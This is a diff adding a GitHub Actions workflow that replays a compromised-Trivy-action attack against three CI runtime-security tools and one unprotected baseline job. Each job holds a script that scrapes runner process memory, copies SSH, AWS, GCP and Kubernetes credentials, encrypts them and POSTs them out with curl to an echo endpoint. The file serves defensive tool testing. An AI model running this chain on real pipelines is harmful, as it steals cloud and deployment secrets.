@@ -1,0 +1,193 @@
+name: Trivy simulation - Cimon, Harden-Runner, kntrl
+
+on: workflow_dispatch
+
+jobs:
+  naked:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      actions: read
+    steps:    
+      - name: Simulate Trivy Attack Payload (Stages 1, 2 & 3)
+        run: |
+          echo "Simulating malicious entrypoint execution from the compromised action..."
+          
+          # Stage 1: Target the GitHub Actions Runner.Worker process to dump memory/secrets
+          echo "Hunting for Runner.Worker process to scrape secrets..."
+          WORKER_PID=$(pgrep -f "Runner.Worker" | head -n 1)
+          if [ -n "$WORKER_PID" ]; then
+            cat /proc/$WORKER_PID/environ > /dev/null 2>&1 || true
+            cat /proc/$WORKER_PID/mem > /dev/null 2>&1 || true
+          else
+            # Fallback to self if worker not found
+            cat /proc/self/environ > /dev/null 2>&1 || true
+          fi
+          
+          # Stage 2: Target standard CI/CD and deployment credential files
+          echo "Scraping deployment and cloud secrets from common locations..."
+          mkdir -p /tmp/harvested_secrets
+          cat ~/.ssh/id_rsa > /tmp/harvested_secrets/id_rsa 2>&1 || true
+          cat ~/.aws/credentials > /tmp/harvested_secrets/aws 2>&1 || true
+          cat ~/.config/gcloud/credentials.db > /tmp/harvested_secrets/gcp 2>&1 || true
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/harvested_secrets/k8s 2>&1 || true
+          
+          # STAGE 3: Encryption and Exfiltration Simulation (NEW)
+          echo "Stage 3: Encrypting and exfiltrating data..."
+          
+          # 3a. Archive the secrets (Staging)
+          tar -czf /tmp/secrets.tar.gz -C /tmp harvested_secrets/ 2>/dev/null || true
+          
+          # 3b. Encrypt the payload (simulating the AES-256-CBC wrapper used in the attack)
+          openssl enc -aes-256-cbc -salt -in /tmp/secrets.tar.gz -out /tmp/secrets.enc -k "malicious_key" 2>/dev/null || true
+          
+          # 3c. Exfiltrate via HTTP POST (ignoring the GitHub-based fallback)
+          curl -X POST -F "data=@/tmp/secrets.enc" https://httpbin.org/post 2>/dev/null || true
+
+
+  cimon:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      actions: read
+    steps:
+      - name: Run Cimon
+        uses: cycodelabs/cimon-action@a0870cc3d9e3bf3cedd28bdb67bf3fd3281e5941
+        with:
+          prevent: true
+          hardening: true
+          report-job-summary: true
+          report-pr-summary: true
+          report-process-tree: true
+          apply-fs-events: true
+          log-level: info
+          fail-on-error: false
+
+      - name: Simulate Trivy Attack Payload (Stages 1, 2 & 3)
+        run: |
+          echo "Simulating malicious entrypoint execution from the compromised action..."
+          
+          # Stage 1: Target the GitHub Actions Runner.Worker process to dump memory/secrets
+          echo "Hunting for Runner.Worker process to scrape secrets..."
+          WORKER_PID=$(pgrep -f "Runner.Worker" | head -n 1)
+          if [ -n "$WORKER_PID" ]; then
+            cat /proc/$WORKER_PID/environ > /dev/null 2>&1 || true
+            cat /proc/$WORKER_PID/mem > /dev/null 2>&1 || true
+          else
+            # Fallback to self if worker not found
+            cat /proc/self/environ > /dev/null 2>&1 || true
+          fi
+          
+          # Stage 2: Target standard CI/CD and deployment credential files
+          echo "Scraping deployment and cloud secrets from common locations..."
+          mkdir -p /tmp/harvested_secrets
+          cat ~/.ssh/id_rsa > /tmp/harvested_secrets/id_rsa 2>&1 || true
+          cat ~/.aws/credentials > /tmp/harvested_secrets/aws 2>&1 || true
+          cat ~/.config/gcloud/credentials.db > /tmp/harvested_secrets/gcp 2>&1 || true
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/harvested_secrets/k8s 2>&1 || true
+          
+          # STAGE 3: Encryption and Exfiltration Simulation (NEW)
+          echo "Stage 3: Encrypting and exfiltrating data..."
+          
+          # 3a. Archive the secrets (Staging)
+          tar -czf /tmp/secrets.tar.gz -C /tmp harvested_secrets/ 2>/dev/null || true
+          
+          # 3b. Encrypt the payload (simulating the AES-256-CBC wrapper used in the attack)
+          openssl enc -aes-256-cbc -salt -in /tmp/secrets.tar.gz -out /tmp/secrets.enc -k "malicious_key" 2>/dev/null || true
+          
+          # 3c. Exfiltrate via HTTP POST (ignoring the GitHub-based fallback)
+          curl -X POST -F "data=@/tmp/secrets.enc" https://httpbin.org/post 2>/dev/null || true
+
+  harden-runner:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      actions: read
+    steps:    
+      - name: Harden Runner start
+        uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
+        with:
+            egress-policy: audit
+
+      - name: Simulate Trivy Attack Payload (Stages 1, 2 & 3)
+        run: |
+          echo "Simulating malicious entrypoint execution from the compromised action..."
+          
+          # Stage 1: Target the GitHub Actions Runner.Worker process to dump memory/secrets
+          echo "Hunting for Runner.Worker process to scrape secrets..."
+          WORKER_PID=$(pgrep -f "Runner.Worker" | head -n 1)
+          if [ -n "$WORKER_PID" ]; then
+            cat /proc/$WORKER_PID/environ > /dev/null 2>&1 || true
+            cat /proc/$WORKER_PID/mem > /dev/null 2>&1 || true
+          else
+            # Fallback to self if worker not found
+            cat /proc/self/environ > /dev/null 2>&1 || true
+          fi
+          
+          # Stage 2: Target standard CI/CD and deployment credential files
+          echo "Scraping deployment and cloud secrets from common locations..."
+          mkdir -p /tmp/harvested_secrets
+          cat ~/.ssh/id_rsa > /tmp/harvested_secrets/id_rsa 2>&1 || true
+          cat ~/.aws/credentials > /tmp/harvested_secrets/aws 2>&1 || true
+          cat ~/.config/gcloud/credentials.db > /tmp/harvested_secrets/gcp 2>&1 || true
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/harvested_secrets/k8s 2>&1 || true
+          
+          # STAGE 3: Encryption and Exfiltration Simulation (NEW)
+          echo "Stage 3: Encrypting and exfiltrating data..."
+          
+          # 3a. Archive the secrets (Staging)
+          tar -czf /tmp/secrets.tar.gz -C /tmp harvested_secrets/ 2>/dev/null || true
+          
+          # 3b. Encrypt the payload (simulating the AES-256-CBC wrapper used in the attack)
+          openssl enc -aes-256-cbc -salt -in /tmp/secrets.tar.gz -out /tmp/secrets.enc -k "malicious_key" 2>/dev/null || true
+          
+          # 3c. Exfiltrate via HTTP POST (ignoring the GitHub-based fallback)
+          curl -X POST -F "data=@/tmp/secrets.enc" https://httpbin.org/post 2>/dev/null || true
+
+  kntrl:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      actions: read
+    steps:    
+      - name: Start kntrl
+        uses: kondukto-io/kntrl-action@v1
+
+      - name: Simulate Trivy Attack Payload (Stages 1, 2 & 3)
+        run: |
+          echo "Simulating malicious entrypoint execution from the compromised action..."
+          
+          # Stage 1: Target the GitHub Actions Runner.Worker process to dump memory/secrets
+          echo "Hunting for Runner.Worker process to scrape secrets..."
+          WORKER_PID=$(pgrep -f "Runner.Worker" | head -n 1)
+          if [ -n "$WORKER_PID" ]; then
+            cat /proc/$WORKER_PID/environ > /dev/null 2>&1 || true
+            cat /proc/$WORKER_PID/mem > /dev/null 2>&1 || true
+          else
+            # Fallback to self if worker not found
+            cat /proc/self/environ > /dev/null 2>&1 || true
+          fi
+          
+          # Stage 2: Target standard CI/CD and deployment credential files
+          echo "Scraping deployment and cloud secrets from common locations..."
+          mkdir -p /tmp/harvested_secrets
+          cat ~/.ssh/id_rsa > /tmp/harvested_secrets/id_rsa 2>&1 || true
+          cat ~/.aws/credentials > /tmp/harvested_secrets/aws 2>&1 || true
+          cat ~/.config/gcloud/credentials.db > /tmp/harvested_secrets/gcp 2>&1 || true
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/harvested_secrets/k8s 2>&1 || true
+          
+          # STAGE 3: Encryption and Exfiltration Simulation (NEW)
+          echo "Stage 3: Encrypting and exfiltrating data..."
+          
+          # 3a. Archive the secrets (Staging)
+          tar -czf /tmp/secrets.tar.gz -C /tmp harvested_secrets/ 2>/dev/null || true
+          
+          # 3b. Encrypt the payload (simulating the AES-256-CBC wrapper used in the attack)
+          openssl enc -aes-256-cbc -salt -in /tmp/secrets.tar.gz -out /tmp/secrets.enc -k "malicious_key" 2>/dev/null || true
+          
+          # 3c. Exfiltrate via HTTP POST (ignoring the GitHub-based fallback)
+          curl -X POST -F "data=@/tmp/secrets.enc" https://httpbin.org/post 2>/dev/null || true
+
+      - name: Stop kntrl
+        uses: kondukto-io/kntrl-action/stop@v1
+        if: always()
